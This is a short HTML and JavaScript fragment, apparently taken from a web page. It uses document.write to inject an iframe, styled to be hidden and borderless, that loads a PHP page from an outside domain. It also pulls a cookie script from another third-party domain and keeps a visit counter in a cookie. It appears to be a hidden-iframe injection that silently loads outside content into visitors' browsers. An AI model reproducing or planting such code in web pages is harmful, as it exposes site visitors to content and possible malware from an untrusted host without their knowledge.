<div id="shownOnlyOnceADay" style="margin-left: 50px;"><center><script type="text/javascript">document.write("<iframe src='http://citiesofdoom.com/teststuff/test_images.php' width=800 height=300 style='hidden' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>");</script></div>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
<script type="text/javascript" src="http://2leep.com/data/jquery.cookie.js"></script>
<script type="text/javascript">
       $(document).ready(function() {
            if( $.cookie('showOnlyOne')>1000 ){
                //it is still within the day
                //hide the div
                $('#shownOnlyOnceADay').hide();
            } else {
                //either cookie already expired, or user never visit the site
                //create the cookie
		if ($.cookie('showOnlyOne')) { var cookieVal = parseInt($.cookie('showOnlyOne'))+1;} else 
		var cookieVal = 1;
                $.cookie('showOnlyOne', cookieVal, { expires: 1, path: '/' });

                //and display the div

		        
            }
        });
        


</script>



